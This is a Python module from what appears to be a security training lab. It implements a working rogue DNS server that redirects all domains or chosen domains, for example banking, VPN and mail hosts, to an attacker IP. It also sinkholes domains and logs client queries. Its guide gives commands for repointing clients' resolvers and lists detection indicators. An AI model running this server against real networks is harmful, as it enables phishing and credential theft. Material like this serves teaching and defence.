"""
Module 3 – Rogue DNS Server
============================
A configurable authoritative-looking DNS server that can:
  • Wildcard-redirect everything to one IP
  • Selectively redirect specific domains
  • Serve NXDOMAIN for everything else (sink-holing)
  • Act as a credential-harvesting facilitator
"""

import json
import re
import socket
import struct
import threading
import time
from datetime import datetime

from modules.base import LabModule
from shared.dns_core import *
from shared.ui import *
from shared.prereqs import check_deps, check_root


class RogueDNSModule(LabModule):
    NAME        = "Rogue DNS Server"
    DESCRIPTION = "Authoritative-looking DNS server with wildcard and per-domain rules"
    MITRE       = "T1584.002 – Compromise Infrastructure: DNS Server"
    DIFFICULTY  = "Beginner"

    GUIDE = """
## Overview
A rogue DNS server intercepts name resolution by convincing clients to use
it as their primary resolver. Once a client is pointed at it (via DHCP
poisoning, /etc/resolv.conf modification, or registry changes), every DNS
query the client sends can be answered with attacker-controlled data.

## Attack Scenarios

### Wildcard Redirect (Phishing)
Every domain resolves to the attacker's IP hosting fake login pages:
```
*.anything.com  →  10.0.0.99  (attacker's HTTP server)
```

### Selective Redirect (Targeted Attack)
Only specific high-value targets are redirected:
```
banking.corp.com  →  10.0.0.99
vpn.corp.com      →  10.0.0.99
mail.corp.com     →  10.0.0.99
*                 →  NXDOMAIN  (everything else fails)
```

### Sinkholing (Defensive Use)
Block malware C2 domains by returning NXDOMAIN or 127.0.0.1:
```
malware-c2.evil.com  →  127.0.0.1  (loopback)
*.tracker.net        →  NXDOMAIN
```

## Client Configuration
Direct a client to use this server:
```
# Linux
echo "nameserver <attacker_ip>" > /etc/resolv.conf

# Windows
netsh interface ip set dns "Local Area Connection" static <attacker_ip>
```

## Detection Indicators
- DNS server IP not in organization's approved resolver list
- Responses from unexpected source addresses
- All domains resolving to same IP (wildcard redirect)
- Absence of NXDOMAIN for clearly nonexistent domains
- TTL values inconsistent with legitimate authoritative servers
"""

    def __init__(self):
        super().__init__()
        self.listen_ip   = "0.0.0.0"
        self.listen_port = 5353
        self.mode        = "wildcard"    # wildcard | selective | sinkhole
        self.redirect_ip = "127.0.0.1"
        self.rules: dict[str, str] = {}  # domain pattern → IP or NXDOMAIN
        self._sock       = None
        self._thread     = None
        self._stop       = threading.Event()
        self._log: list[dict] = []

    def setup(self) -> bool:
        if not check_root():
            return False

        section("Rogue DNS Server Configuration")
        self.listen_ip   = ask("Listen IP",           self.listen_ip)
        self.listen_port = int(ask("Listen port",     str(self.listen_port)))
        self.redirect_ip = ask("Default redirect IP", self.redirect_ip)

        mode_idx = choose("Server mode", [
            "Wildcard redirect (everything → redirect IP)",
            "Selective redirect (configure per-domain rules)",
            "Sinkhole (NXDOMAIN or loopback for target domains)",
        ])
        self.mode = ["wildcard", "selective", "sinkhole"][mode_idx]

        if self.mode == "selective":
            self._configure_selective_rules()
        elif self.mode == "sinkhole":
            self._configure_sinkhole_rules()

        success("Setup complete.")
        return True

    def _configure_selective_rules(self):
        section("Selective Redirect Rules")
        info("Enter domain rules (empty domain to finish).")
        info("Use * as wildcard prefix, e.g. *.corp.com")
        while True:
            domain = ask("Domain pattern (or Enter to finish)", "")
            if not domain:
                break
            ip = ask(f"  Redirect {domain} to IP", self.redirect_ip)
            self.rules[domain.lower()] = ip
            info(f"  Added: {domain} → {ip}")

        if not self.rules:
            # Add a default example
            self.rules["target.lab.local"]  = self.redirect_ip
            self.rules["*.target.lab.local"] = self.redirect_ip
            info(f"Using default rules: *.target.lab.local → {self.redirect_ip}")

    def _configure_sinkhole_rules(self):
        section("Sinkhole Rules")
        info("Enter domains to sinkhole (NXDOMAIN). Empty to use defaults.")
        sinkhole_ip = ask("Sinkhole IP (or 'NXDOMAIN')", "NXDOMAIN")
        while True:
            domain = ask("Domain to sinkhole (or Enter to finish)", "")
            if not domain:
                break
            self.rules[domain.lower()] = sinkhole_ip
            info(f"  Sinkholed: {domain} → {sinkhole_ip}")

        if not self.rules:
            self.rules["malware-c2.evil.com"]   = "NXDOMAIN"
            self.rules["*.tracker.evil.net"]    = "127.0.0.1"
            info("Using default sinkhole rules")

    # ------------------------------------------------------------------
    def run(self):
        section("Starting Rogue DNS Server")
        info(f"Listen : {self.listen_ip}:{self.listen_port}")
        info(f"Mode   : {self.mode}")
        if self.mode == "wildcard":
            info(f"Rules  : * → {self.redirect_ip}")
        else:
            for pattern, target in self.rules.items():
                info(f"Rules  : {pattern:<30} → {target}")

        print()
        warn("Point clients at this server:")
        print(f"  {C.LGREEN}echo 'nameserver {self._get_local_ip()}' > /etc/resolv.conf{C.RESET}")
        print()
        warn("Press Ctrl+C to stop the server.")
        print()

        self._stop.clear()
        self._start_server()

        # Live query log
        section("Live Query Log")
        last_count = 0
        try:
            while not self._stop.is_set():
                time.sleep(0.5)
                if len(self._log) > last_count:
                    for entry in self._log[last_count:]:
                        self._print_log_entry(entry)
                    last_count = len(self._log)
        except KeyboardInterrupt:
            pass

        self._stop.set()
        print()
        self._print_summary()

    def _get_local_ip(self) -> str:
        if self.listen_ip not in ("0.0.0.0", ""):
            return self.listen_ip
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def _start_server(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)
        self._sock.bind((self.listen_ip, self.listen_port))
        self._thread = threading.Thread(target=self._serve_loop, daemon=True)
        self._thread.start()
        success(f"Rogue DNS server is UP on {self.listen_ip}:{self.listen_port}")

    def _serve_loop(self):
        while not self._stop.is_set():
            try:
                data, addr = self._sock.recvfrom(512)
                threading.Thread(
                    target=self._handle_query,
                    args=(data, addr),
                    daemon=True
                ).start()
            except socket.timeout:
                continue
            except Exception:
                if not self._stop.is_set():
                    time.sleep(0.1)

    def _handle_query(self, data: bytes, addr: tuple):
        try:
            msg = parse_message(data)
            if not msg or not msg.questions:
                return
            q      = msg.questions[0]
            qname  = q["qname"].lower().rstrip(".")
            qtype  = q["qtype"]
            txid   = msg.header["txid"]

            resolved, action = self._resolve(qname)

            log_entry = {
                "ts":     datetime.now().strftime("%H:%M:%S"),
                "client": addr[0],
                "qname":  qname,
                "qtype":  format_dns_type(qtype),
                "result": resolved or "NXDOMAIN",
                "action": action,
            }
            self._log.append(log_entry)

            if resolved == "NXDOMAIN" or resolved is None:
                resp = build_nxdomain_response(txid, qname)
            else:
                resp = build_a_response(txid, qname, resolved, ttl=60)

            self._sock.sendto(resp, addr)
        except Exception:
            pass

    def _resolve(self, qname: str) -> tuple[str | None, str]:
        """Apply routing rules. Returns (ip_or_None, action_label)."""
        if self.mode == "wildcard":
            return self.redirect_ip, "WILDCARD_REDIRECT"

        # Check rules: exact match first, then wildcard prefix
        if qname in self.rules:
            v = self.rules[qname]
            return (None, "SINKHOLE_NX") if v == "NXDOMAIN" else (v, "SELECTIVE_REDIRECT")

        # Wildcard prefix match: *.domain.com
        for pattern, target in self.rules.items():
            if pattern.startswith("*."):
                suffix = pattern[2:]
                if qname == suffix or qname.endswith("." + suffix):
                    if target == "NXDOMAIN":
                        return None, "SINKHOLE_NX"
                    return target, "WILDCARD_RULE"

        return None, "NXDOMAIN_DEFAULT"

    def _print_log_entry(self, e: dict):
        action_color = {
            "WILDCARD_REDIRECT":  C.LRED,
            "SELECTIVE_REDIRECT": C.LRED,
            "WILDCARD_RULE":      C.LRED,
            "SINKHOLE_NX":        C.YELLOW,
            "NXDOMAIN_DEFAULT":   C.GRAY,
        }.get(e["action"], C.WHITE)

        print(f"  {C.DIM}{e['ts']}{C.RESET}  "
              f"{C.CYAN}{e['client']:<15}{C.RESET}  "
              f"{e['qname']:<35}  "
              f"{C.BOLD}{e['qtype']:<6}{C.RESET}  "
              f"{action_color}{e['action']:<22}{C.RESET}  "
              f"{C.LGREEN}{e['result']}{C.RESET}")

    def _print_summary(self):
        section("Session Summary")
        info(f"Total queries served: {len(self._log)}")
        from collections import Counter
        actions = Counter(e["action"] for e in self._log)
        for action, count in actions.most_common():
            tag(action, str(count))

        if self._log:
            top_clients = Counter(e["client"] for e in self._log).most_common(5)
            info("Top querying clients:")
            for client, cnt in top_clients:
                tag(client, f"{cnt} queries")

        # Save log
        log_path = f"logs/rogue_dns_{int(time.time())}.json"
        os.makedirs("logs", exist_ok=True)
        with open(log_path, "w") as f:
            json.dump(self._log, f, indent=2)
        info(f"Query log saved to: {log_path}")

    def teardown(self):
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
